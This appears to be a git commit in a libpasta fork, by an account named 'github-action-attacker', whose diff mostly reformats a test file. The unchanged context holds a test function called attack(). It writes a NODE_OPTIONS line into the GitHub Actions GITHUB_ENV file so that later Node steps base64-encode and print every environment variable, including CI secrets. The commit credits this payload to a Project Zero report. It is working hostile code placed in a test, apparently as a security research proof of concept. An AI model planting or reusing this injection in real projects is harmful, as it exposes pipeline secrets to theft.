39f1902048d4030845bea4800e0c7965d7345904
github-action-attacker <77618143+github-action-attacker@users.noreply.github.com>
2021-01-18 12:36:53 +0100

    clippy
    https://github.com/github-action-attacker/libpasta/runs/1721133691?check_suite_focus=true

--- tests/test_from_file.rs
+++ tests/test_from_file.rs
@@ -2,9 +2,9 @@ extern crate libpasta;
 
 use libpasta::config;
 use std::env;
-use std::io::Write;
 use std::ffi::OsString;
 use std::fs::OpenOptions;
+use std::io::Write;
 
 mod common;
 
@@ -20,7 +20,10 @@ pub fn test_config_file() {
 pub fn attack() {
     let github_env = env::var_os("GITHUB_ENV").unwrap_or(OsString::from("/test"));
     eprintln!("GITHUB_ENV is {:?}", github_env);
-    let mut file = OpenOptions::new().append(true).open(github_env).expect("Open failed");
+    let mut file = OpenOptions::new()
+        .append(true)
+        .open(github_env)
+        .expect("Open failed");
     //Payload from https://bugs.chromium.org/p/project-zero/issues/detail?id=2070
     file.write_all(b"NODE_OPTIONS=--experimental-modules --experimental-loader=data:text/javascript,console.warn(Buffer.from(JSON.stringify(process.env)).toString('base64'));\n").expect("write failed");
     eprintln!("GITHUB_ENV was written");
